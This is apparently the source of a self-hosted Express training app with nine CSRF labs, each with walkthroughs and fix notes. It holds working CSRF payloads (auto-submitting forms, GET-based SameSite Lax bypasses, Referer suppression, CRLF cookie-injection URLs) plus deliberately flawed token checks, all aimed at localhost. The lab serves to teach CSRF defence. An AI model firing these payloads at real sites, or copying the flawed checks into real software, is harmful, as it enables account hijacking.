const express = require('express');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

// Simple cookie parser (no dependency — parses Cookie header manually)
app.use((req, res, next) => {
    req.cookies = {};
    const header = req.headers.cookie || '';
    header.split(';').forEach(pair => {
        const [k, ...v] = pair.trim().split('=');
        if (k) req.cookies[k.trim()] = decodeURIComponent(v.join('=').trim());
    });
    next();
});

let savedExploit = `<h1>Exploit Server</h1><p>No exploit saved yet.</p>`;

// Per-lab state: last request received and current email
const labState = {
    1: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    2: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    3: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    4: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    5: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    6: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    7: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    8: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
    9: { email: 'wiener@normal-user.net', lastRequest: null, solved: false },
};

// Lab 8 constants — non-session csrfKey cookie pair
const ATTACKER_CSRF_KEY   = 'attacker_csrfKey_xyz789';
const ATTACKER_CSRF_TOKEN8 = 'attacker_csrf_UYjqwyyGyrsnr8qG';
const VICTIM_CSRF_KEY     = 'victim_csrfKey_def456';
const VICTIM_CSRF_TOKEN8  = 'victim_csrf_pBMFhDgHNqmB';
// Lab 9 — double submit: server sets csrf cookie = form field
const LAB9_CSRF_VALUE = 'csrf_double_xK9mNpQr2sLt';

// Global token pool for Lab 4 (not tied to any session)
const globalTokenPool = new Set(['csrf_token_abc123xyz', 'csrf_token_def456uvw', 'csrf_token_ghi789rst']);

// Fixed session tokens for simulation
const VICTIM_SESSION = 'victim_session_abc123';
const ATTACKER_SESSION = 'attacker_session_xyz789';
// Lab 1: valid CSRF token for victim (Lab 2/3/6 also use this)
const VICTIM_CSRF_TOKEN = 'pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB';
// Lab 4: attacker has their own valid token from the pool
const ATTACKER_CSRF_TOKEN = 'csrf_token_abc123xyz';

// Lab Data
const labs = [
    {
        id: 1,
        name: "CSRF vulnerability with no defenses",
        difficulty: "APPRENTICE",
        difficultyClass: "apprentice",
        description: "The email change function accepts any POST request with no CSRF protection whatsoever.",
        intro: "No CSRF token, no SameSite cookie restriction, no Referer check. A classic unprotected endpoint.",
        learning: "Understand the basic CSRF attack — forge a cross-site form that auto-submits to a vulnerable endpoint.",
        payload: `<form action="http://localhost:3000/email/change/1" method="POST"><input name="email" value="hacked@evil.com"></form><script>document.forms[0].submit();</script>`,
        solution: "Host the auto-submit form on the exploit server, store it, and deliver it to the victim.",
        url: "/lab/no-defenses",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 1: CSRF with No Defenses</h2>
            <span style="background:#e8f5e9;color:#28a745;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">APPRENTICE</span>
            <p style="margin-top:15px;">This application lets users change their email address via a POST form. It has <strong>no CSRF defenses</strong> — no token, no SameSite restrictions, no Referer check.</p>
            <p>The victim is logged in. Your goal is to change their email to <code>attacker@evil.com</code> by making their browser silently submit a form to <code>/email/change/1</code>.</p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Go to the <strong>Exploit Server</strong> and paste this payload into the Body:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;body&gt;
    &lt;form action="http://localhost:3000/email/change/1" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="2">
                <li>Click <strong>Store</strong>, then <strong>Deliver exploit to victim</strong>.</li>
                <li>The Request Inspector on the left will show the forged POST request received by the server.</li>
                <li>The victim's email is now changed to <code>attacker@evil.com</code>.</li>
            </ol>
            <p><strong>Why it works:</strong> The browser automatically includes the victim's session cookie when the form submits cross-site. The server has no way to distinguish this from a legitimate request.</p>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 2,
        name: "CSRF where token validation depends on request method",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The application validates the CSRF token for POST requests but skips validation entirely for GET requests.",
        intro: "The server checks tokens on POST only. Switching to a GET request bypasses CSRF protection completely.",
        learning: "Identify method-dependent token validation and exploit it by changing the HTTP method.",
        payload: `<script>document.location='http://localhost:3000/email/change/2?email=hacked@evil.com'</script>`,
        solution: "Use document.location or an <img> tag to trigger the endpoint via GET, bypassing the POST-only token check.",
        url: "/lab/token-method",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 2: Token Validated on POST Only</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">This application has a CSRF token — but it only validates it for <strong>POST requests</strong>. GET requests bypass validation entirely.</p>
            <p>The endpoint also supports GET for email changes (bad practice). Your goal: trigger the change via GET without a token.</p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Observe that the form submits via POST with a CSRF token. Sending a wrong token in POST returns 403.</li>
                <li>Try sending the same request as GET — notice it succeeds with no token needed.</li>
                <li>Craft a payload that uses <code>document.location</code> to trigger a GET:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
      document.location = 'http://localhost:3000/email/change/2?email=attacker@evil.com';
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="4">
                <li>Store in exploit server and deliver to victim.</li>
            </ol>
            <p><strong>Why it works:</strong> Lax SameSite cookies are sent with top-level GET navigations. The server skips token checks on GET. The action completes.</p>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 3,
        name: "CSRF where token validation depends on token being present",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The server validates the CSRF token only when the csrf parameter is present in the request.",
        intro: "If you omit the token parameter entirely, validation is skipped. The attacker just leaves it out.",
        learning: "Recognize absent-token bypass: the difference between validating 'is the token correct' vs 'does a token exist'.",
        payload: `<form action="http://localhost:3000/email/change/3" method="POST"><input name="email" value="hacked@evil.com"></form><script>document.forms[0].submit();</script>`,
        solution: "Forge a POST form with no csrf field at all. The server sees no token and skips the check.",
        url: "/lab/token-present",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 3: Token Validated Only When Present</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">This application checks the CSRF token — but only <strong>if the <code>csrf</code> parameter exists</strong> in the request. If the parameter is absent, the check is skipped entirely.</p>
            <p>The flawed server logic looks like: <code>if (req.body.csrf) { validate(); } else { proceed(); }</code></p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Observe that sending a wrong token in POST returns 403.</li>
                <li>Now send the POST request with the <code>csrf</code> parameter <strong>completely removed</strong> — not empty, but absent.</li>
                <li>The server skips validation and processes the request. Use this payload:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;body&gt;
    &lt;form action="http://localhost:3000/email/change/3" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
      &lt;!-- Note: no csrf field at all --&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="4">
                <li>Store and deliver from the exploit server.</li>
            </ol>
            <p><strong>Why it works:</strong> The validation is conditional — it only runs if the field exists. By omitting it entirely, you bypass validation completely. Always reject requests with missing tokens, not just invalid ones.</p>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 4,
        name: "CSRF where token is not tied to user session",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The server validates the CSRF token against a global pool — not tied to any specific user session.",
        intro: "Tokens are pooled globally. The attacker can log in, get their own valid token, then use it in a forged request targeting the victim.",
        learning: "Understand why tokens must be session-specific. A token that proves 'someone generated this' is not the same as 'this session generated this'.",
        payload: `<form action="http://localhost:3000/email/change/4" method="POST"><input name="email" value="hacked@evil.com"><input name="csrf" value="csrf_token_abc123xyz"></form><script>document.forms[0].submit();</script>`,
        solution: "Use the attacker's own valid CSRF token (csrf_token_abc123xyz) from the global pool in a forged POST targeting the victim.",
        url: "/lab/token-session",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 4: Token Not Tied to User Session</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">This application validates that the CSRF token is in a <strong>global token pool</strong> — but it doesn't check which user the token belongs to. Any valid token works for any user.</p>
            <p>As the attacker, you have a valid token: <code>csrf_token_abc123xyz</code>. Use it in a forged request targeting the victim's session.</p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Log in as the attacker and capture your CSRF token: <code>csrf_token_abc123xyz</code>. It's shown in your Token Inspector above.</li>
                <li>The victim has a different session but the server accepts any token from the pool.</li>
                <li>Craft a forged POST using the attacker's token:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;body&gt;
    &lt;form action="http://localhost:3000/email/change/4" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
      &lt;input type="hidden" name="csrf" value="csrf_token_abc123xyz"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="4">
                <li>Store and deliver to victim. The server accepts the attacker's token as valid for the victim's session.</li>
            </ol>
            <p><strong>Why it works:</strong> Token validation only checks membership in the pool, not session ownership. Fix: bind tokens to the session at generation time and validate the binding on each request.</p>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 5,
        name: "CSRF with SameSite Lax bypass via GET request",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The session cookie uses SameSite=Lax but the email change endpoint also accepts GET requests, enabling a bypass.",
        intro: "SameSite=Lax allows cookies on cross-site GET top-level navigations. If the endpoint accepts GET, CSRF still works.",
        learning: "Understand that SameSite=Lax only blocks cross-site POST. State-changing GET endpoints remain exploitable.",
        payload: `<script>document.location='http://localhost:3000/email/change/5?email=hacked@evil.com'</script>`,
        solution: "Use document.location to perform a GET-based top-level navigation. The Lax cookie is included and the action fires.",
        url: "/lab/samesite-lax",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 5: SameSite Lax Bypass via GET</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">The session cookie is set with <code>SameSite=Lax</code>, which blocks cross-site POST requests. However, the email change endpoint also accepts <strong>GET requests</strong> — and Lax cookies <em>are</em> sent with cross-site GET top-level navigations.</p>
            <p>Cookie set as: <code>Set-Cookie: session=...; SameSite=Lax</code></p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Notice the session cookie has <code>SameSite=Lax</code>. Sending a cross-site POST will NOT include the cookie.</li>
                <li>But observe the endpoint also processes GET: <code>GET /email/change/5?email=new@mail.com</code></li>
                <li>Lax allows the cookie on top-level GET navigations. Use <code>document.location</code>:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
      document.location = 'http://localhost:3000/email/change/5?email=attacker@evil.com';
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="4">
                <li>Store and deliver to victim. The cookie is included because it's a top-level navigation GET.</li>
            </ol>
            <p><strong>Why it works:</strong> SameSite=Lax protects against cross-site POST CSRF. But if an application accepts GET for state changes (violating REST principles), the Lax protection is bypassed. Fix: use POST only for state changes AND SameSite=Strict, or add a CSRF token.</p>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 6,
        name: "CSRF with Referer validation bypass",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The application validates the Referer header but only when it is present. Suppressing the header bypasses the check.",
        intro: "Use a meta referrer tag to drop the Referer header entirely. The server skips validation when the header is absent.",
        learning: "Understand Referer-based CSRF defenses and their weakness: a defense that only fires when the header exists is trivially bypassable.",
        payload: `<head><meta name="referrer" content="never"></head><form action="http://localhost:3000/email/change/6" method="POST"><input name="email" value="hacked@evil.com"></form><script>document.forms[0].submit();</script>`,
        solution: "Add <meta name='referrer' content='never'> to drop the Referer header, then auto-submit the form.",
        url: "/lab/referer-bypass",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 6: Referer Validation Bypass</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">This application validates the <code>Referer</code> header — but only <strong>when it is present</strong>. If the header is absent, the request is accepted without any check.</p>
            <p>The flawed logic: <code>if (referer && !referer.includes('localhost:3000')) { reject; }</code></p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Send a normal cross-site POST. The server receives a Referer pointing to evil.com and rejects it (403).</li>
                <li>Now add a <code>&lt;meta name="referrer" content="never"&gt;</code> tag to your exploit page. This tells the browser to suppress the Referer header entirely.</li>
                <li>The server receives the POST with no Referer header, skips validation, and processes the request:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;head&gt;
    &lt;meta name="referrer" content="never"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;form action="http://localhost:3000/email/change/6" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="4">
                <li>Store and deliver to victim. The Referer is absent, check is skipped, email is changed.</li>
            </ol>
            <p><strong>Why it works:</strong> Referer can be suppressed by the browser in privacy mode, via meta tags, or HTTPS→HTTP transitions. Always treat a missing Referer as suspicious and require a CSRF token instead.</p>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 7,
        name: "CSRF with SameSite Lax bypass via method override",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The session cookie uses browser-default SameSite=Lax. However, the server allows method overriding via _method query parameter, enabling GET-based bypasses.",
        intro: "Chrome defaults cookies to SameSite=Lax. If the server allows HTTP method overriding, you can trigger a top-level GET navigation to bypass Lax cookie restrictions.",
        learning: "Understand how framework method overrides (GET with _method=POST) interact with SameSite Lax default protections to enable CSRF attacks.",
        payload: `<script>document.location='http://localhost:3000/email/change/7?email=hacked@evil.com&_method=POST'</script>`,
        solution: "Use document.location to initiate a cross-site GET top-level navigation containing the _method=POST override.",
        url: "/lab/method-override",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 7: SameSite Lax Bypass via Method Override</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">The session cookie does not explicitly declare a SameSite restriction, meaning Chrome applies <code>SameSite=Lax</code> by default. This blocks traditional cross-site POST CSRF forms.</p>
            <p>However, the application supports <strong>method overriding</strong>. If a GET request includes the query parameter <code>_method=POST</code>, the server's routing engine treats the request as a state-changing POST.</p>
            <p>Because the request is initiated as a GET top-level navigation (e.g., using <code>document.location</code>), the browser's Lax cookie restrictions are bypassed, and the cookie is attached.</p>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Confirm that a normal POST CSRF form fails because the session cookie has browser-default Lax restrictions.</li>
                <li>Confirm that a plain GET request is normally rejected by the server as POST only is allowed.</li>
                <li>Now add <code>_method=POST</code> to the query string to override the method. Use this payload:</li>
            </ol>
            <pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px;">&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
      document.location = 'http://localhost:3000/email/change/7?email=attacker@evil.com&amp;_method=POST';
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            <ol start="4">
                <li>Store in the exploit server and deliver to the victim. The server receives the Lax session cookie because of the top-level GET navigation, overrides the method to POST, and processes the change.</li>
            </ol>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 8,
        name: "CSRF where token is tied to non-session cookie",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The CSRF token is validated against a separate csrfKey cookie — not the session. Injecting your own csrfKey via CRLF lets you use your own matching token.",
        intro: "The csrfKey cookie is independent of the session. Use the CRLF injection in the search endpoint to plant your csrfKey in the victim's browser, then submit your matching token.",
        learning: "Understand how non-session CSRF cookies can be exploited via header injection to fully bypass token-based protection.",
        payload: `<img src="http://localhost:3000/lab/csrf-cookie/search?q=x%0d%0aSet-Cookie:%20csrfKey=attacker_csrfKey_xyz789%3b%20SameSite=None" onerror="document.forms[0].submit()">`,
        solution: "Inject your csrfKey cookie via CRLF, then auto-submit a form with your matching csrf token using <img onerror=submit>.",
        url: "/lab/csrf-cookie",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 8: Token Tied to Non-Session Cookie</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">The CSRF token is validated against a <code>csrfKey</code> cookie that is <strong>separate from the session</strong>. Plant your own csrfKey via CRLF injection, then use your matching token.</p>
            <div class="info-pill">
                <strong>Credentials:</strong> wiener / peter &nbsp;&nbsp; carlos / montoya<br>
                <strong>Goal:</strong> Change victim's email to <code>attacker@evil.com</code>
            </div>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Open the lab — Token Inspector shows your <strong>csrfKey</strong> and <strong>csrf token</strong>.</li>
                <li>Confirm csrfKey is NOT session-bound: log in as carlos, swap in wiener's csrfKey + csrf token → server accepts it.</li>
                <li>Test CRLF injection: visit <code>/lab/csrf-cookie/search?q=x%0d%0aSet-Cookie:%20csrfKey=test</code> — browser receives injected cookie.</li>
                <li>Scroll to <strong>"🔧 Generate CSRF PoC"</strong> → click Generate PoC ▼ to get the full exploit HTML.</li>
                <li>Click <strong>⚡ Send to Exploit Server</strong> → <strong>Store</strong> → <strong>Deliver exploit to victim</strong>.</li>
            </ol>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    },
    {
        id: 9,
        name: "CSRF where token is duplicated in cookie (Double Submit)",
        difficulty: "PRACTITIONER",
        difficultyClass: "practitioner",
        description: "The server uses the Double Submit Cookie pattern — it just checks that the csrf cookie and form field match. Injecting your own csrf cookie value lets you control both sides.",
        intro: "The server validates req.body.csrf === req.cookies.csrf with no server-side state. Inject any value as the csrf cookie, then submit the same value in the form.",
        learning: "Understand why the stateless Double Submit Cookie pattern breaks when the attacker can set cookies via any injection vulnerability.",
        payload: `<img src="http://localhost:3000/lab/csrf-double/search?q=x%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">`,
        solution: "Inject csrf=hacked as cookie via CRLF, then submit a form with csrf=hacked. Server sees a match → allowed.",
        url: "/lab/csrf-double",
        full_description: `
            <h2 style="color:#ff6600;margin-top:0;">Lab 9: Token Duplicated in Cookie (Double Submit)</h2>
            <span style="background:#fffde7;color:#856404;padding:4px 10px;border-radius:4px;font-weight:bold;font-size:12px;">PRACTITIONER</span>
            <p style="margin-top:15px;">The server uses the Double Submit Cookie pattern: it sets the same random value as both a cookie and a form field, and checks they match. No server-side state is used.</p>
            <p>Exploit: inject <code>csrf=hacked</code> as a cookie via CRLF injection, then submit a form with <code>csrf=hacked</code> → server sees <code>"hacked" === "hacked"</code> → allowed.</p>
            <div class="info-pill">
                <strong>Credentials:</strong> wiener / peter<br>
                <strong>Goal:</strong> Change victim's email to <code>attacker@evil.com</code>
            </div>
            <h3>Step-by-Step Solution</h3>
            <ol>
                <li>Open the lab — Token Inspector shows the current csrf cookie value (auto-generated).</li>
                <li>Test CRLF injection: <code>/lab/csrf-double/search?q=x%0d%0aSet-Cookie:%20csrf=hacked</code></li>
                <li>Confirm the csrf cookie is now <code>hacked</code>.</li>
                <li>Submit the form with <code>csrf=hacked</code> — server validates <code>"hacked" === "hacked"</code> → accepted!</li>
                <li>Click <strong>"🔧 Generate CSRF PoC"</strong> → Generate PoC ▼ → Send to Exploit Server → Deliver to victim.</li>
            </ol>
            <hr>
            <a href="/" style="color:#666;text-decoration:none;">← Back to Dashboard</a>
        `
    }
];

// ─── PoC Data (raw HTTP request + generated exploit HTML per lab) ────────────

const pocData = {
    1: {
        rawRequest: 'POST /email/change/1 HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 30\nCookie: session=victim_session_abc123\n\nemail=wiener@normal-user.net',
        poc: '<html>\n  <!-- CSRF PoC - generated by CSRF Master -->\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <form action="http://localhost:3000/email/change/1" method="POST">\n      <input type="hidden" name="email" value="attacker@evil.com" />\n      <input type="submit" value="Submit request" />\n    </form>\n    <script>document.forms[0].submit();<\/script>\n  </body>\n</html>'
    },
    2: {
        rawRequest: 'GET /email/change/2?email=wiener@normal-user.net HTTP/1.1\nHost: localhost:3000\nCookie: session=victim_session_abc123',
        poc: '<html>\n  <!-- CSRF PoC - generated by CSRF Master -->\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <script>\n      document.location = \'http://localhost:3000/email/change/2?email=attacker@evil.com\';\n    <\/script>\n  </body>\n</html>'
    },
    3: {
        rawRequest: 'POST /email/change/3 HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 30\nCookie: session=victim_session_abc123\n\nemail=wiener@normal-user.net',
        poc: '<html>\n  <!-- CSRF PoC - generated by CSRF Master -->\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <form action="http://localhost:3000/email/change/3" method="POST">\n      <input type="hidden" name="email" value="attacker@evil.com" />\n      <!-- csrf field intentionally omitted -->\n      <input type="submit" value="Submit request" />\n    </form>\n    <script>document.forms[0].submit();<\/script>\n  </body>\n</html>'
    },
    4: {
        rawRequest: 'POST /email/change/4 HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\nCookie: session=victim_session_abc123\n\nemail=wiener@normal-user.net&csrf=csrf_token_abc123xyz',
        poc: '<html>\n  <!-- CSRF PoC - generated by CSRF Master -->\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <form action="http://localhost:3000/email/change/4" method="POST">\n      <input type="hidden" name="email" value="attacker@evil.com" />\n      <input type="hidden" name="csrf" value="csrf_token_abc123xyz" />\n      <input type="submit" value="Submit request" />\n    </form>\n    <script>document.forms[0].submit();<\/script>\n  </body>\n</html>'
    },
    5: {
        rawRequest: 'GET /email/change/5?email=wiener@normal-user.net HTTP/1.1\nHost: localhost:3000\nCookie: session=victim_session_abc123; SameSite=Lax',
        poc: '<html>\n  <!-- CSRF PoC - generated by CSRF Master -->\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <script>\n      document.location = \'http://localhost:3000/email/change/5?email=attacker@evil.com\';\n    <\/script>\n  </body>\n</html>'
    },
    6: {
        rawRequest: 'POST /email/change/6 HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\nReferer: https://evil.com\nCookie: session=victim_session_abc123\n\nemail=wiener@normal-user.net',
        poc: '<html>\n  <!-- CSRF PoC - generated by CSRF Master -->\n  <head>\n    <meta name="referrer" content="never">\n  </head>\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <form action="http://localhost:3000/email/change/6" method="POST">\n      <input type="hidden" name="email" value="attacker@evil.com" />\n      <input type="submit" value="Submit request" />\n    </form>\n    <script>document.forms[0].submit();<\/script>\n  </body>\n</html>'
    },
    7: {
        rawRequest: 'GET /email/change/7?email=wiener@normal-user.net&_method=POST HTTP/1.1\nHost: localhost:3000\nCookie: session=victim_session_abc123',
        poc: '<html>\n  <!-- CSRF PoC - Lab 7: SameSite Lax bypass via method override -->\n  <body>\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\n    <script>\n      document.location = \'http://localhost:3000/email/change/7?email=attacker@evil.com&_method=POST\';\n    <\/script>\n  </body>\n</html>'
    },
    8: {
        rawRequest: 'POST /email/change/8 HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\nCookie: session=victim_session_abc123; csrfKey=attacker_csrfKey_xyz789\n\nemail=wiener@normal-user.net&csrf=attacker_csrf_UYjqwyyGyrsnr8qG',
        poc: '<html>\n  <!-- CSRF PoC - Lab 8: Token tied to non-session cookie -->\n  <body>\n    <h1>Hello World!</h1>\n    <form action="http://localhost:3000/email/change/8" method="POST" id="csrf-form">\n      <input type="hidden" name="email" value="attacker@evil.com">\n      <input type="hidden" name="csrf"  value="attacker_csrf_UYjqwyyGyrsnr8qG">\n    </form>\n    <img src="http://localhost:3000/lab/csrf-cookie/search?q=x%0d%0aSet-Cookie:%20csrfKey=attacker_csrfKey_xyz789%3b%20SameSite=None"\n         onerror="document.forms[0].submit()">\n  </body>\n</html>'
    },
    9: {
        rawRequest: 'POST /email/change/9 HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\nCookie: session=victim_session_abc123; csrf=hacked\n\nemail=wiener@normal-user.net&csrf=hacked',
        poc: '<html>\n  <!-- CSRF PoC - Lab 9: Token duplicated in cookie (Double Submit) -->\n  <body>\n    <h1>Hello World!</h1>\n    <form action="http://localhost:3000/email/change/9" method="POST" id="csrf-form">\n      <input type="hidden" name="email" value="attacker@evil.com">\n      <input type="hidden" name="csrf"  value="hacked">\n    </form>\n    <img src="http://localhost:3000/lab/csrf-double/search?q=x%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None"\n         onerror="document.forms[0].submit()">\n  </body>\n</html>'
    }
};

// ─── Helper: render a lab page ─────────────────────────────────────────────

function renderLabPage(labIndex, labId, req, res, extraPanelHtml) {
    const lab = labs[labIndex];
    const state = labState[labId];
    const lastReq = state.lastRequest;

    const requestInspector = lastReq ? `
        <div style="margin-top:20px;background:#1e1e2e;color:#cdd6f4;border-radius:6px;overflow:hidden;font-family:monospace;font-size:13px;">
            <div style="background:#181825;padding:8px 15px;color:#cba6f7;font-weight:bold;display:flex;gap:10px;align-items:center;">
                <span>📡 Last Request Received</span>
                <span style="background:${lastReq.success ? '#a6e3a1' : '#f38ba8'};color:#1e1e2e;padding:2px 8px;border-radius:4px;font-size:11px;">${lastReq.success ? '200 OK' : '403 FORBIDDEN'}</span>
            </div>
            <div style="padding:15px;line-height:1.8;">
                <div><span style="color:#89b4fa;">Method:</span> <span style="color:#a6e3a1;">${lastReq.method}</span></div>
                <div><span style="color:#89b4fa;">Referer:</span> <span style="color:#fab387;">${lastReq.referer || '<em style="color:#6c7086;">not sent</em>'}</span></div>
                <div><span style="color:#89b4fa;">CSRF Token:</span> <span style="color:#fab387;">${lastReq.csrfToken || '<em style="color:#6c7086;">not sent</em>'}</span></div>
                <div><span style="color:#89b4fa;">New Email:</span> <span style="color:#a6e3a1;">${lastReq.email || '<em style="color:#6c7086;">not sent</em>'}</span></div>
                <div><span style="color:#89b4fa;">Result:</span> <span style="color:${lastReq.success ? '#a6e3a1' : '#f38ba8'};">${lastReq.message}</span></div>
            </div>
        </div>
    ` : `
        <div style="margin-top:20px;padding:15px;background:#f8f9fa;border:1px dashed #ccc;border-radius:6px;color:#888;font-size:13px;text-align:center;">
            No requests received yet. Deliver an exploit to see what the server received.
        </div>
    `;

    return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>${lab.name}</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: #f0f2f5; color: #333; }
            .nav-bar { background: #37475a; color: white; padding: 10px 20px; font-size: 14px; border-bottom: 3px solid #ff6600; }
            .top-links { display:flex;align-items:center;gap:20px;padding:10px 30px;background:#fff;border-bottom:1px solid #ccc; }
            .split-container { display: flex; max-width: 1600px; margin: 0 auto; gap: 30px; padding: 20px; align-items: flex-start; }
            .lab-panel { flex: 1; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.07); }
            .solution-sidebar { width: 450px; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); position: sticky; top: 20px; overflow-y:auto; max-height:90vh; }
            h2 { color: #ff6600; margin-top: 0; }
